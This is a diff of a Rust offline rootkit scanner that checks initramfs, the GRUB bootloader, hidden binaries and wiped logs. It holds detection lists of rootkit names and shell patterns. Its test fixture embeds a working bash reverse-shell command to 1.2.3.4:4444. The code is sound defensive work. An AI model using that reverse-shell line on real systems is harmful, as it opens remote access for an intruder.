-                let path = line.trim();
-                if path.is_empty() { continue; }
-
-                let filename = Path::new(path).file_name()
-                    .and_then(|s| s.to_str())
-                    .unwrap_or("")
-                    .to_lowercase();
-
-                // Known rootkit modules inside initramfs
-                let rootkit_names = ["diamorphine", "reptile", "bdvl", "jynx",
-                    "suterusu", "kovid", "beurk"];
-                for rk in &rootkit_names {
-                    if filename.contains(rk) {
-                        send(tx, Finding::new(Severity::Danger, MODULE, "Initramfs Rootkit",
-                            &format!("Rootkit module '{}' embedded in initramfs: {}",
-                                rk, initrd.display()))
-                            .with_detail(&format!("File: {}", path)));
-                    }
-                }
-
-                // .ko files in initramfs — scan for hooks
-                if path.ends_with(".ko") {
-                    if let Ok(data) = fs::read(path) {
-                        let hook_sigs: &[&[u8]] = &[
-                            b"sys_call_table", b"hide_pid", b"hide_port", b"rootkit",
-                        ];
-                        let mut hits = 0;
-                        for sig in hook_sigs {
-                            if data.windows(sig.len()).any(|w| w == *sig) {
-                                hits += 1;
-                            }
-                        }
-                        if hits >= 2 {
-                            send(tx, Finding::new(Severity::Warning, MODULE, "Initramfs Hook",
-                                &format!("Kernel module in initramfs has {} hook signatures: {}",
-                                    hits, filename))
-                                .with_detail(&format!("Inside: {}", initrd.display())));
-                        }
-                    }
-                }
-
-                // Scripts with suspicious content — only .sh files
-                if path.ends_with(".sh") {
-                    if let Ok(content) = fs::read_to_string(path) {
-                        let lower = content.to_lowercase();
-                        let suspicious = ["/dev/tcp", "backdoor", "rootkit",
-                            "reverse_shell", "bind_shell", "meterpreter"];
-                        for pat in &suspicious {
-                            if lower.contains(pat) {
-                                send(tx, Finding::new(Severity::Warning, MODULE, "Initramfs Script",
-                                    &format!("Suspicious pattern '{}' in initramfs script: {}",
-                                        pat, filename))
-                                    .with_detail(&format!("Inside: {}", initrd.display())));
-                                break;
-                            }
-                        }
-                    }
-                }
-            }
-        }
-
-        let _ = fs::remove_dir_all(&tmp_dir);
-    }
-
-    send(tx, Finding::new(Severity::Info, MODULE, "Initramfs",
-        &format!("{} initramfs image(s) scanned", initrd_files.len())));
-}
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  5. BOOTLOADER SCAN — GRUB integrity
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-fn bootloader_scan(tx: &Sender, root: &str) {
-    progress(tx, "Checking bootloader integrity...");
-
-    // GRUB config
-    let grub_cfg = target(root, "/boot/grub/grub.cfg");
-    let grub_cfg2 = target(root, "/boot/grub2/grub.cfg");
-
-    let grub_path = if grub_cfg.exists() { Some(grub_cfg) }
-        else if grub_cfg2.exists() { Some(grub_cfg2) }
-        else { None };
-
-    if let Some(ref path) = grub_path {
-        if let Ok(content) = fs::read_to_string(path) {
-            let lower = content.to_lowercase();
-
-            // Check for suspicious kernel parameters
-            let suspicious_params = ["init=/bin/sh", "init=/bin/bash", "single",
-                "rd.break", "rdinit=", "debug_shell"];
-            for param in &suspicious_params {
-                if lower.contains(&param.to_lowercase()) {
-                    send(tx, Finding::new(Severity::Warning, MODULE, "GRUB Config",
-                        &format!("Suspicious boot parameter in grub.cfg: {}", param))
-                        .with_detail("Could be used for persistent root shell on boot"));
-                }
-            }
-
-            // Custom entries that load unknown modules
-            if lower.contains("insmod") {
-                for line in content.lines() {
-                    let trimmed = line.trim().to_lowercase();
-                    if trimmed.starts_with("insmod") {
-                        let known_grub_modules = ["ext2", "ext4", "xfs", "btrfs", "fat",
-                            "ntfs", "part_gpt", "part_msdos", "normal", "linux",
-                            "loopback", "gzio", "lvm", "raid", "search",
-                            "configfile", "terminal", "serial", "video",
-                            "gfxterm", "gfxmenu", "png", "font", "echo",
-                            "ls", "cat", "test", "true", "sleep", "reboot",
-                            "halt", "iso9660", "udf", "all_video", "boot",
-                            "chain", "cryptodisk", "luks", "gcry_rijndael",
-                            "gcry_sha256", "mdraid09", "mdraid1x", "diskfilter",
-                            "loadenv", "keystatus", "regexp", "probe",
-                            "password_pbkdf2", "gcry_sha512", "lzopio",
-                            "search_fs_uuid", "search_fs_file", "search_label",
-                            "biosdisk", "multiboot", "play", "trig",
-                            "lspci", "usb", "uhci", "ohci", "ehci",
-                            "usbms", "xhci"];
-                        let module_name = trimmed.replace("insmod", "").trim().to_string();
-                        if !module_name.is_empty() && !known_grub_modules.iter().any(|m| module_name.contains(m)) {
-                            send(tx, Finding::new(Severity::Warning, MODULE, "GRUB Module",
-                                &format!("Unknown GRUB module loaded: {}", module_name)));
-                        }
-                    }
-                }
-            }
-        }
-    }
-
-    // Check GRUB binary itself
-    let grub_bins = [
-        target(root, "/boot/grub/i386-pc/core.img"),
-        target(root, "/boot/grub/x86_64-efi/grubx64.efi"),
-        target(root, "/boot/efi/EFI/debian/grubx64.efi"),
-        target(root, "/boot/efi/EFI/ubuntu/grubx64.efi"),
-        target(root, "/boot/efi/EFI/kali/grubx64.efi"),
-    ];
-
-    for bin in &grub_bins {
-        if bin.exists() {
-            if let Ok(meta) = bin.metadata() {
-                // GRUB EFI binary should be owned by root
-                if meta.uid() != 0 {
-                    send(tx, Finding::new(Severity::Danger, MODULE, "Bootloader",
-                        &format!("GRUB binary not owned by root: {}", bin.display()))
-                        .with_detail(&format!("Owner: uid={}", meta.uid())));
-                }
-                // Check if writable by others
-                if meta.permissions().mode() & 0o022 != 0 {
-                    send(tx, Finding::new(Severity::Danger, MODULE, "Bootloader",
-                        &format!("GRUB binary is world/group writable: {}", bin.display())));
-                }
-            }
-        }
-    }
-}
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  6. HIDDEN FILES — raw filesystem scan
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-fn hidden_files_scan(tx: &Sender, root: &str) {
-    progress(tx, "Scanning for hidden malware on disk (rootkit can't hide from offline scan)...");
-
-    let scan_dirs = ["tmp", "dev/shm", "var/tmp", "run"];
-    for dir in &scan_dirs {
-        let scan_path = target(root, dir);
-        if !scan_path.exists() { continue; }
-
-        if let Ok(entries) = fs::read_dir(&scan_path) {
-            for entry in entries.flatten() {
-                let path = entry.path();
-                let name = entry.file_name().to_string_lossy().to_string();
-
-                // ELF binaries in temp dirs
-                if path.is_file() {
-                    if let Ok(data) = fs::read(&path) {
-                        if data.len() >= 4 && &data[..4] == b"\x7fELF" {
-                            send(tx, Finding::new(Severity::Danger, MODULE, "Hidden Binary",
-                                &format!("ELF binary in {}: {}", dir, name))
-                                .with_detail(&format!("Size: {} bytes — invisible to live rootkit-hidden scan", data.len())));
-                        }
-                        if data.len() >= 2 && &data[..2] == b"MZ" {
-                            send(tx, Finding::new(Severity::Danger, MODULE, "Hidden PE",
-                                &format!("PE executable in {}: {}", dir, name)));
-                        }
-                    }
-                }
-
-                // Hidden dirs with executables
-                if name.starts_with('.') && name != "." && name != ".." && path.is_dir() {
-                    if let Ok(sub_entries) = fs::read_dir(&path) {
-                        for sub in sub_entries.flatten() {
-                            if sub.path().is_file() {
-                                if let Ok(data) = fs::read(sub.path()) {
-                                    if data.len() >= 4 && &data[..4] == b"\x7fELF" {
-                                        send(tx, Finding::new(Severity::Danger, MODULE, "Hidden Dir Binary",
-                                            &format!("ELF in hidden dir: {}/{}/{}",
-                                                dir, name, sub.file_name().to_string_lossy()))
-                                            .with_detail("Offline scan — rootkit cannot hide this file"));
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    }
-
-    // SUID binaries in unusual locations
-    let suid_scan_dirs = ["tmp", "var/tmp", "dev/shm", "home"];
-    for dir in &suid_scan_dirs {
-        let scan_path = target(root, dir);
-        if !scan_path.exists() { continue; }
-
-        if let Ok(output) = Command::new("find")
-            .args([scan_path.to_str().unwrap_or(""), "-perm", "-4000", "-type", "f"])
-            .output()
-        {
-            let stdout = String::from_utf8_lossy(&output.stdout);
-            for line in stdout.lines() {
-                let path = line.trim();
-                if !path.is_empty() {
-                    send(tx, Finding::new(Severity::Danger, MODULE, "Hidden SUID",
-                        &format!("SUID binary in suspicious location: {}", path))
-                        .with_detail("Could be privilege escalation backdoor"));
-                }
-            }
-        }
-    }
-}
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  7. LOG EVIDENCE — check for wiping
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-fn log_evidence_scan(tx: &Sender, root: &str) {
-    progress(tx, "Checking logs for evidence of tampering...");
-
-    let critical_logs = [
-        "var/log/auth.log", "var/log/syslog", "var/log/kern.log",
-        "var/log/messages", "var/log/secure", "var/log/audit/audit.log",
-    ];
-
-    for log in &critical_logs {
-        let log_path = target(root, log);
-        if !log_path.exists() { continue; }
-
-        if let Ok(meta) = log_path.metadata() {
-            // Zero-byte critical log
-            if meta.len() == 0 {
-                send(tx, Finding::new(Severity::Danger, MODULE, "Log Wiped",
-                    &format!("Critical log file is empty: {}", log))
-                    .with_detail("Log was likely wiped by attacker"));
-            }
-            // Wrong owner
-            if meta.uid() != 0 && meta.uid() != 104 { // 104 = syslog
-                send(tx, Finding::new(Severity::Warning, MODULE, "Log Owner",
-                    &format!("Log file has unusual owner (uid={}): {}", meta.uid(), log)));
-            }
-        }
-    }
-
-    // Check if wtmp/btmp were truncated
-    let wtmp = target(root, "var/log/wtmp");
-    if let Ok(meta) = wtmp.metadata() {
         if meta.len() == 0 {
-            send(tx, Finding::new(Severity::Danger, MODULE, "Login Log Wiped",
-                "wtmp is empty — login records were wiped"));
+            send(
+                tx,
+                Finding::new(Severity::Danger, MODULE, "Log Wiped", &format!("Critical log is empty on disk: {}", log)).subject(&format!("empty:{}", log)),
+            );
         }
+        if !ok_uids.contains(&meta.uid()) && !ok_gids.contains(&meta.gid()) {
+            send(
+                tx,
+                Finding::new(Severity::Warning, MODULE, "Log Owner", &format!("{} owned by uid {} gid {}", log, meta.uid(), meta.gid()))
+                    .subject(&format!("owner:{}", log)),
+            );
+        }
+    }
+    if root.lstat("/var/log/journal").map(|m| m.is_dir()).unwrap_or(false) && root.read_dir("/var/log/journal").is_empty() {
+        send(tx, Finding::new(Severity::Warning, MODULE, "Log Wiped", "/var/log/journal exists but is empty").subject("journal-empty"));
     }
 }
 
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  PUBLIC ENTRY POINT
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-pub fn scan(root: &str, tx: Sender) {
+pub fn scan(target: &str, cfg: &ScanConfig, tx: Sender) {
     let start = Instant::now();
     let _ = tx.send(ScanEvent::ModuleStart(MODULE.to_string()));
-
-    // Verify target exists and looks like a Linux root
-    let etc = target(root, "/etc");
-    let usr = target(root, "/usr");
-    if !etc.exists() || !usr.exists() {
-        send(&tx, Finding::new(Severity::Danger, MODULE, "Target",
-            &format!("Target '{}' doesn't look like a Linux root filesystem", root))
-            .with_detail("Missing /etc or /usr — make sure the disk is mounted correctly"));
+    let root = Root::new(target);
+    if !root.exists("/etc") || !root.exists("/usr") {
+        send(
+            &tx,
+            Finding::new(Severity::Danger, MODULE, "Target", &format!("'{}' doesn't look like a Linux root filesystem", target))
+                .with_detail("Missing /etc or /usr — is the disk mounted correctly?")
+                .subject("target"),
+        );
         let _ = tx.send(ScanEvent::ModuleDone(MODULE.to_string(), start.elapsed()));
         return;
     }
+    let pm = pkg::pm_of(&root);
+    send(&tx, Finding::new(Severity::Info, MODULE, "Target", &format!("Offline target {} (package manager: {})", root.base.display(), pm)).subject("target"));
 
-    send(&tx, Finding::new(Severity::Info, MODULE, "Target",
-        &format!("Scanning offline target: {}", root)));
-
-    kernel_module_scan(&tx, root);
-    binary_integrity(&tx, root);
-    persistence_scan(&tx, root);
-    initramfs_scan(&tx, root);
-    bootloader_scan(&tx, root);
-    hidden_files_scan(&tx, root);
-    log_evidence_scan(&tx, root);
-
+    kernel_module_scan(&root, cfg, &tx);
+    progress(&tx, "Verifying packaged files against checksums...");
+    if let Some(db) = &cfg.hashdb {
+        match pkg::verify_hashdb(&root, db) {
+            Ok(r) => files::report_verify_as(&tx, r, "hashdb", MODULE),
+            Err(e) => send(&tx, Finding::new(Severity::Warning, MODULE, "Binary Integrity", &e).subject("hashdb")),
+        }
+    }
+    let r = pkg::verify(&root, cfg.full, if cfg.full { Duration::from_secs(1800) } else { Duration::from_secs(300) });
+    files::report_verify_as(&tx, r, &pm.to_string(), MODULE);
+    progress(&tx, "Running the persistence sweep against the disk...");
+    persistence::scan_root(&root, &tx);
+    antiforensics::pam_checks(&root, &tx, MODULE);
+    initramfs_scan(&root, &tx);
+    bootloader_scan(&root, &tx);
+    hidden_files_scan(&root, &tx);
+    log_evidence_scan(&root, &tx);
     let _ = tx.send(ScanEvent::ModuleDone(MODULE.to_string(), start.elapsed()));
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn cpio_entry(name: &str, data: &[u8], mode: u32) -> Vec<u8> {
+        let mut v = format!(
+            "070701{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}{:08X}",
+            1,
+            mode,
+            0,
+            0,
+            1,
+            0,
+            data.len(),
+            0,
+            0,
+            0,
+            0,
+            name.len() + 1,
+            0
+        )
+        .into_bytes();
+        v.extend_from_slice(name.as_bytes());
+        v.push(0);
+        while v.len() % 4 != 0 {
+            v.push(0);
+        }
+        v.extend_from_slice(data);
+        while v.len() % 4 != 0 {
+            v.push(0);
+        }
+        v
+    }
+
+    #[test]
+    fn cpio_newc_parsing() {
+        let mut a = cpio_entry("kernel/x86/microcode/GenuineIntel.bin", b"ucode", 0o100644);
+        a.extend(cpio_entry("TRAILER!!!", b"", 0));
+        a.extend(vec![0u8; 512]); // padding between archives
+        a.extend(cpio_entry("usr/lib/modules/6.1/extra/diamorphine.ko", b"\x7fELF...sys_call_table", 0o100644));
+        a.extend(cpio_entry("scripts/init-bottom/x", b"#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", 0o100755));
+        a.extend(cpio_entry("TRAILER!!!", b"", 0));
+        let mut out = Vec::new();
+        parse_initramfs(&a, 0, &mut out);
+        assert_eq!(out.len(), 3);
+        assert_eq!(out[0].data, b"ucode");
+        assert!(out[1].name.ends_with("diamorphine.ko"));
+        assert!(persistence::danger_set().is_match(String::from_utf8_lossy(&out[2].data).lines().nth(1).unwrap()));
+    }
+
+    #[test]
+    fn truncated_cpio_does_not_panic() {
+        let mut a = cpio_entry("file", b"0123456789", 0o100644);
+        a.truncate(a.len() - 6);
+        let mut out = Vec::new();
+        parse_initramfs(&a, 0, &mut out);
+        assert!(out.is_empty());
+        let mut huge = b"070701".to_vec();
+        huge.extend(b"FFFFFFFF".repeat(13));
+        parse_initramfs(&huge, 0, &mut out);
+    }
+
+    #[test]
+    fn hook_indicators() {
+        let ko = b"...kallsyms_lookup_name...sys_call_table...__x64_sys_getdents64...";
+        assert_eq!(hook_score(ko).len(), 3);
+    }
 }
